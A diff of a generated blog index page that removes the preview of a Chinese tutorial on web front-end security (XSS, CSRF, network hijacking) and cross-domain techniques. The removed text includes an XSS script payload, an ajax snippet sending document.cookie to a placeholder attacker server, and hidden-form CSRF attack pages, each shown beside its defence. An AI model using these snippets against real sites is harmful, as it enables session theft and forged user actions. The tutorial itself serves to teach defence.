@@ -394,7 +394,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/17/HTTP-0/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/17/HTTP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Bomir">
@@ -413,7 +413,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/17/HTTP-0/" itemprop="url">HTTP</a></h2>
+                <a class="post-title-link" href="/2019/08/17/HTTP/" itemprop="url">HTTP</a></h2>
         
 
         <div class="post-meta">
@@ -465,7 +465,7 @@
 
           
           
-             <span id="/2019/08/17/HTTP-0/" class="leancloud_visitors" data-flag-title="HTTP">
+             <span id="/2019/08/17/HTTP/" class="leancloud_visitors" data-flag-title="HTTP">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -1432,7 +1432,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/06/其他问题汇总/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/16/Python多线程/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Bomir">
@@ -1451,7 +1451,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/05/06/其他问题汇总/" itemprop="url">其他问题总结</a></h2>
+                <a class="post-title-link" href="/2019/03/16/Python多线程/" itemprop="url">Python多线程</a></h2>
         
 
         <div class="post-meta">
@@ -1463,8 +1463,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-06T17:17:14+08:00">
-                2018-05-06
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-16T14:45:16+08:00">
+                2019-03-16
               </time>
             
 
@@ -1486,8 +1486,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/前端/" itemprop="url" rel="index">
-                    <span itemprop="name">前端</span>
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
                   </a>
                 </span>
 
@@ -1503,7 +1503,7 @@
 
           
           
-             <span id="/2018/05/06/其他问题汇总/" class="leancloud_visitors" data-flag-title="其他问题总结">
+             <span id="/2019/03/16/Python多线程/" class="leancloud_visitors" data-flag-title="Python多线程">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -1528,7 +1528,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  9,732
+                  4,314
                 </span>
               
 
@@ -1544,7 +1544,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  38
+                  15
                 </span>
               
             </div>
@@ -1567,217 +1567,148 @@
       
         
           
-            <h2 id="1-WEB前端安全那些事儿"><a href="#1-WEB前端安全那些事儿" class="headerlink" title="==1. WEB前端安全那些事儿=="></a>==1. WEB前端安全那些事儿==</h2><h2 id="前端攻击都有哪些形式，我该如何防范？"><a href="#前端攻击都有哪些形式，我该如何防范？" class="headerlink" title="前端攻击都有哪些形式，我该如何防范？"></a>前端攻击都有哪些形式，我该如何防范？</h2><h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><h4 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h4><p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。举个例子，我们有个社交网站，允许大家相互访问空间，网站可能是这样做的：其实在web前端方面，可以简单的理解为一种javascript代码注入。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $username=<span class="string">"侯医生"</span>;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCYTPE HTML&gt;</div><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;meta charset=<span class="string">"utf-8"</span> /&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            用户名：<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $username;<span class="meta">?&gt;</span></div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            第一条状态：侯医生的状态<span class="number">1</span></div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            第二条状态：侯医生的状态<span class="number">2</span></div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            第三条状态：侯医生的状态<span class="number">3</span></div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<p>运行时，展现形式如图所示：</p>
-<p><img src="https://segmentfault.com/img/bVB9cO" alt="image"></p>
-<p>但是，如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。代码如下，效果如图</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $username=&quot;&lt;script&gt;alert(&apos;侯医生&apos;);&lt;/script&gt;&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p><img src="https://segmentfault.com/img/bVB9or" alt="image"></p>
-<p>如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$.ajax(&#123;</div><div class="line">    url: &apos;自己的服务器&apos;,</div><div class="line">    dataType: &apos;jsonp&apos;,</div><div class="line">    data: &#123;&apos;盗取的用户cookie&apos;: document.cookie&#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
-<h4 id="如何防范"><a href="#如何防范" class="headerlink" title="如何防范"></a>如何防范</h4><p>目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $username=<span class="string">"&lt;script&gt;alert('侯医生');&lt;/script&gt;"</span>;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCYTPE HTML&gt;</div><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;meta charset=<span class="string">"utf-8"</span> /&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码--&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            用户名：<span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlentities($username);<span class="meta">?&gt;</span></div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            第一条状态：侯医生的状态<span class="number">1</span></div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            第二条状态：侯医生的状态<span class="number">2</span></div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            第三条状态：侯医生的状态<span class="number">3</span></div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<p><img src="https://segmentfault.com/img/bVB9qd" alt="image"></p>
-<p>其实，我们再来看看网页源码，如图1.2.2</p>
-<p><img src="https://segmentfault.com/img/bVB9qG" alt="image"><br>虽然显示出来是有script标签的，但是实际上，script标签的左右尖括号(&gt;&lt;)，均被转义为html字符实体，所以，便不会被当做标签来解析的，但是实际显示的时候，这两个尖括号，还是可以正常展示的。</p>
-<h4 id="升级防御"><a href="#升级防御" class="headerlink" title="升级防御"></a>升级防御</h4><p>我们将输出的字符串中的\反斜杠进行转义(json转义)。这样，\就不会被当做unicode码的开头来被处理了。代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.getElementById(&apos;username_info&apos;).innerHTML = &lt;?php echo json_encode(htmlentities($username));?&gt;;</div></pre></td></tr></table></figure>
-<p>都说了道高一尺魔高一丈了，你以为防得住后端输出，黑客大大们就没办法攻击了吗。我们有的时候，会有一些习惯，拿URL上的get参数去构建网页。好比说，直接拿url上的用户名去展示啦，拿url上的一些回跳地址之类的。但是url上的参数，我们是无法提前对其进行转义的。接下来，来个例子，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;meta charset=&quot;utf-8&quot; /&gt;</div><div class="line">        &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            用户名：&lt;?php echo htmlentities($username);?&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            第一条状态：侯医生的状态1</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            第二条状态：侯医生的状态2</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            第三条状态：侯医生的状态3</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div&gt;版权所有：&lt;span id=&quot;username_info&quot;&gt;&lt;/span&gt;&lt;/div&gt;</div><div class="line">        &lt;script&gt;</div><div class="line">            var param = /=(.+)$/.exec(location.search);</div><div class="line">            var value = decodeURIComponent(param[1]);</div><div class="line">            $(&apos;#username_info&apos;).append(value);</div><div class="line">        &lt;/script&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<p>上述代码，满足了一个很正常的需求，解开URL中的一个参数，并将其渲染至页面上。但是，这里面存在一个风险，如果黑客在URL的这个参数中，加入js代码，这样便又会被执行。</p>
-<p><img src="https://segmentfault.com/img/bVB9zm" alt="image"></p>
-<p>像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出，代码如下，效果如图</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">    var value = decodeURIComponent(&quot;&lt;?php echo htmlentities($_GET[&apos;username&apos;]);?&gt;&quot;);</div><div class="line">    $(&apos;#username_info&apos;).append(value);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p><img src="https://segmentfault.com/img/bVB9zP" alt="image"></p>
-<p>如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。php的设置方法如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    setcookie(&quot;userpass&quot;, &quot;doctorhou-shuai&quot;, NULL, NULL, NULL, NULL, TRUE);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>如图，我们的cookie已经种上了，并且有了httpOnly标识<br><img src="https://segmentfault.com/img/bVB9Hh" alt="image"><br>我们通过js无法获取cookie中的设定有httpOnly的字段：<br><img src="https://segmentfault.com/img/bVB9Hv" alt="image"></p>
-<h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><p>CSRF攻击在百度百科中的解释是：<br>CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。<br>其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。</p>
-<h4 id="如何攻击？"><a href="#如何攻击？" class="headerlink" title="如何攻击？"></a>如何攻击？</h4><h5 id="要合理使用post与get"><a href="#要合理使用post与get" class="headerlink" title="要合理使用post与get"></a>要合理使用post与get</h5><p>通常我们会为了省事儿，把一些应当提交的数据，做成get请求。殊不知，这不仅仅是违反了http的标准而已，也同样会被黑客所利用。比如，你开发的网站中，有一个购买商品的操作。你是这么开发的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">// 从cookie中获取用户名，看似稳妥</div><div class="line">$username = $_COOKIE[&apos;username&apos;];</div><div class="line">$productId = $_GET[&apos;pid&apos;];</div><div class="line">// 这里进行购买操作</div><div class="line">//store_into_database($username, $productId);</div><div class="line">?&gt;</div><div class="line">&lt;meta charset=&quot;utf-8&quot; /&gt;</div><div class="line">&lt;?php</div><div class="line">echo $username . &apos;买入商品：&apos; . $productId;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>而商品ID图个省事儿，就使用了url中的get参数。买商品的话，如图</p>
-<p><img src="https://segmentfault.com/img/bVB9Ca" alt="image"></p>
-<p>那么，黑客的网站可以这样开发：<br>&lt;!DOCYTPE HTML&gt;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;meta charset=&quot;utf-8&quot; /&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;img src=&quot;http://localhost:8082/lab/xsrflab/submit.php?pid=1&quot; /&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<p>这样的话，用户只需要访问一次黑客的网站，其实就相当于在你的网站中，操作了一次。然而用户却没有感知。</p>
-<p>如果你使用了post请求来处理关键业务的，还是有办法可以破解的。我们的业务代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$username = $_COOKIE[&apos;username&apos;];</div><div class="line">// 换为post了，可以规避黑客直接的提交</div><div class="line">$productId = $_POST[&apos;pid&apos;];</div><div class="line">// 这里进行购买操作</div><div class="line">//store_into_database($username, $productId);</div><div class="line">?&gt;</div><div class="line">&lt;meta charset=&quot;utf-8&quot; /&gt;</div><div class="line">&lt;?php</div><div class="line">echo $username . &apos;买入商品：&apos; . $productId;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>黑客代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCYTPE HTML&gt;</div><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;meta charset=&quot;utf-8&quot; /&gt;</div><div class="line">        &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;button id=&quot;clickme&quot;&gt;点我看相册&lt;/button&gt;</div><div class="line">        &lt;script&gt;</div><div class="line">            $(&apos;#clickme&apos;).on(&apos;click&apos;, function () &#123;</div><div class="line">                // 用户再不知情的情况下，提交了表单，服务器这边也会以为是用户提交过来的。</div><div class="line">                $(&apos;#myform&apos;).submit();</div><div class="line">            &#125;);</div><div class="line">        &lt;/script&gt;</div><div class="line">        &lt;form id=&quot;myform&quot; style=&quot;display:none;&quot; target=&quot;myformer&quot; method=&quot;post&quot; action=&quot;http://myhost:8082/lab/xsrflab/submit.php&quot;&gt;</div><div class="line">            &lt;input type=&quot;hidden&quot; name=&quot;pid&quot; value=&quot;1&quot;&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">        &lt;iframe name=&quot;myformer&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<p>效果如图</p>
-<p><img src="https://segmentfault.com/img/bVB9DR" alt="image"></p>
-<p>点击后，用户进行了提交，却连自己都不知情。这种情况如何防御呢？</p>
-<p>最简单的办法就是加验证码，这样除了用户，黑客的网站是获取不到用户本次session的验证码的。但是这样也会降低用户的提交体验，特别是有些经常性的操作，如果总让用户输入验证码，用户也会非常的烦。</p>
-<p>另一种方式，就是在用访问的页面中，都种下验证用的token，用户所有的提交都必须带上本次页面中生成的token，这种方式的本质和使用验证码没什么两样，但是这种方式，整个页面每一次的session，使用同一个token就行，很多post操作，开发者就可以自动带上当前页面的token。如果token校验不通过，则证明此次提交并非从本站发送来，则终止提交过程。如果token确实为本网站生成的话，则可以通过</p>
-<h3 id="网络劫持攻击"><a href="#网络劫持攻击" class="headerlink" title="网络劫持攻击"></a>网络劫持攻击</h3><p>很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。</p>
-<p>如果你的网站还没有进行https加密的化，则在表单提交部分，最好进行非对称加密–即客户端加密，只有服务端能解开。这样中间的劫持者便无法获取加密内容的真实信息了。</p>
-<h3 id="控制台注入代码"><a href="#控制台注入代码" class="headerlink" title="控制台注入代码"></a>控制台注入代码</h3><h3 id="我们平时开发要注意些什么？"><a href="#我们平时开发要注意些什么？" class="headerlink" title="我们平时开发要注意些什么？"></a>我们平时开发要注意些什么？</h3><ul>
-<li>开发时要提防用户产生的内容，要对用户输入的信息进行层层检测</li>
-<li>要注意对用户的输出内容进行过滤(进行转义等)</li>
-<li>重要的内容记得要加密传输(无论是利用https也好，自己加密也好)</li>
-<li>get请求与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。</li>
-<li>对于URL上携带的信息，要谨慎使用。</li>
-<li>心中时刻记着，自己的网站哪里可能有危险。</li>
-</ul>
-<h2 id="2-跨域"><a href="#2-跨域" class="headerlink" title="==2. 跨域=="></a>==2. 跨域==</h2><p>受浏览器同源策略的限制，本域的js不能操作其他域的页面对象（比如DOM）。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。所以我们要通过一些方法使本域的js能够操作其他域的页面对象或者使其他域的js能操作本域的页面对象</p>
-<p>单向跨域（一般用于获取数据）</p>
-<h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3><p>原理：因为通过script标签引入的js是不受同源策略的限制的（正如前文提到的baidu.com的页面加载了google.com的js）。所以我们可以通过script标签引入一个js或者是一个其他后缀形式（如php，jsp等）的文件，此文件返回一个js函数的调用，如返回JSONP_getUsers([“paco”,”john”,”lili”])，也就是说此文件返回的结果调用了JSONP_getUsers函数，并且把[“paco”,”john”,”lili”]传进去，这个[“paco”,”john”,”lili”]是一个用户列表。那么如果此时我们的页面中有一个JSONP_getUsers函数，那么JSONP_getUsers就被调用到，并且传入了用户列表。此时就实现了在本域获取其他域数据的功能，也就是跨域</p>
-<h3 id="动态创建script标签"><a href="#动态创建script标签" class="headerlink" title="动态创建script标签"></a>动态创建script标签</h3><p>这种方法其实是JSONP跨域的简化版，JSONP只是在此基础上加入了回调函数。</p>
-<h3 id="Access-Control"><a href="#Access-Control" class="headerlink" title="Access Control"></a>Access Control</h3><p>此跨域方法目前只在很少的浏览器中得以支持，这些浏览器可以发送一个跨域的HTTP请求（Firefox, Google Chrome等通过XMLHTTPRequest实现，IE8下通过XDomainRequest实现），请求的响应必须包含一个Access- Control-Allow-Origin的HTTP响应头，该响应头声明了请求域的可访问权限。例如baidu.com对google.com下的getUsers.php发送了一个跨域的HTTP请求（通过ajax），那么getUsers.php必须加入如下的响应头：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">header(&quot;Access-Control-Allow-Origin: http://www.baidu.com&quot;);//表示允许baidu.com跨域请求本文件</div></pre></td></tr></table></figure>
-<h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>window 对象的name属性是一个很特别的属性，当该window的location变化，然后重新加载，它的name属性可以依然保持不变。那么我们可以在页面 A中用iframe加载其他域的页面B，而页面B中用JavaScript把需要传递的数据赋值给window.name，iframe加载完成之后（iframe.onload），页面A修改iframe的地址，将其变成同域的一个地址，然后就可以读出iframe的window.name的值了（因为A中的window.name和iframe中的window.name互相独立的，所以不能直接在A中获取window.name，而要通过iframe获取其window.name）。这个方式非常适合单向的数据请求，而且协议简单、安全。不会像JSONP那样不做限制地执行外部脚本。</p>
-<h3 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h3><p>在数据提供方没有提供对JSONP协议或者 window.name协议的支持，也没有对其它域开放访问权限时，我们可以通过server proxy的方式来抓取数据。例如当baidu.com域下的页面需要请求google.com下的资源文件getUsers.php时，直接发送一个指向 google.com/getUsers.php的Ajax请求肯定是会被浏览器阻止。这时，我们在baidu.com下配一个代理，然后把Ajax请求绑定到这个代理路径下，例如baidu.com/proxy/, 然后这个代理发送HTTP请求访问google.com下的getUsers.php，跨域的HTTP请求是在服务器端进行的（服务器端没有同源策略限制），客户端并没有产生跨域的Ajax请求。这个跨域方式不需要和目标资源签订协议，带有侵略性。</p>
-<h3 id="document-domain（两个iframe之间）"><a href="#document-domain（两个iframe之间）" class="headerlink" title="document.domain（两个iframe之间）"></a>document.domain（两个iframe之间）</h3><p>通过修改document的domain属性，我们可以在域和子域或者不同的子域之间通信。同域策略认为域和子域隶属于不同的域，比如baidu.com和 youxi.baidu.com是不同的域，这时，我们无法在baidu.com下的页面中调用youxi.baidu.com中定义的JavaScript方法。但是当我们把它们document的domain属性都修改为baidu.com，浏览器就会认为它们处于同一个域下，那么我们就可以互相获取对方数据或者操作对方DOM了。</p>
-<p>问题：<br>1、安全性，当一个站点被攻击后，另一个站点会引起安全漏洞。<br>2、如果一个页面中引入多个iframe，要想能够操作所有iframe，必须都得设置相同domain。</p>
-<h3 id="location-hash（两个iframe之间），又称FIM，Fragment-Identitier-Messaging的简写"><a href="#location-hash（两个iframe之间），又称FIM，Fragment-Identitier-Messaging的简写" class="headerlink" title="location.hash（两个iframe之间），又称FIM，Fragment Identitier Messaging的简写"></a>location.hash（两个iframe之间），又称FIM，Fragment Identitier Messaging的简写</h3><p>因为父窗口可以对iframe进行URL读写，iframe也可以读写父窗口的URL，URL有一部分被称为hash，就是#号及其后面的字符，它一般用于浏览器锚点定位，Server端并不关心这部分，应该说HTTP请求过程中不会携带hash，所以这部分的修改不会产生HTTP请求，但是会产生浏览器历史记录。此方法的原理就是改变URL的hash部分来进行双向通信。每个window通过改变其他 window的location来发送消息（由于两个页面不在同一个域下IE、Chrome不允许修改parent.location.hash的值，所以要借助于父窗口域名下的一个代理iframe），并通过监听自己的URL的变化来接收消息。这个方式的通信会造成一些不必要的浏览器历史记录，而且有些浏览器不支持onhashchange事件，需要轮询来获知URL的改变，最后，这样做也存在缺点，诸如数据直接暴露在了url中，数据容量和类型都有限等。</p>
-<h3 id="使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）"><a href="#使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）" class="headerlink" title="使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）"></a>使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）</h3><p>高级浏览器Internet Explorer 8+, chrome，Firefox , Opera  和 Safari 都将支持这个功能。这个功能主要包括接受信息的”message”事件和发送消息的”postMessage”方法。比如baidu.com域的A页面通过iframe嵌入了一个google.com域的B页面，可以通过以下方法实现A和B的通信</p>
-<p>A页面通过postMessage方法发送消息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">window.onload = function() &#123;  </div><div class="line">    var ifr = document.getElementById(&apos;ifr&apos;);  </div><div class="line">    var targetOrigin = &quot;http://www.google.com&quot;;  </div><div class="line">    ifr.contentWindow.postMessage(&apos;hello world!&apos;, targetOrigin);  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
-<p>postMessage的使用方法：</p>
-<p>otherWindow.postMessage(message, targetOrigin);</p>
-<p>otherWindow:   指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口<br>message:   是要发送的消息，类型为 String、Object (IE8、9 不支持)<br>targetOrigin:   是限定消息接收范围，不限制请使用 ‘*’</p>
-<p>B页面通过message事件监听并接受消息:  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">var onmessage = function (event) &#123;  </div><div class="line">  var data = event.data;//消息  </div><div class="line">  var origin = event.origin;//消息来源地址  </div><div class="line">  var source = event.source;//源Window对象  </div><div class="line">  if(origin==&quot;http://www.baidu.com&quot;)&#123;  </div><div class="line">console.log(data);//hello world!  </div><div class="line">  &#125;  </div><div class="line">&#125;;  </div><div class="line">if (typeof window.addEventListener != &apos;undefined&apos;) &#123;  </div><div class="line">  window.addEventListener(&apos;message&apos;, onmessage, false);  </div><div class="line">&#125; else if (typeof window.attachEvent != &apos;undefined&apos;) &#123;  </div><div class="line">  //for ie  </div><div class="line">  window.attachEvent(&apos;onmessage&apos;, onmessage);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
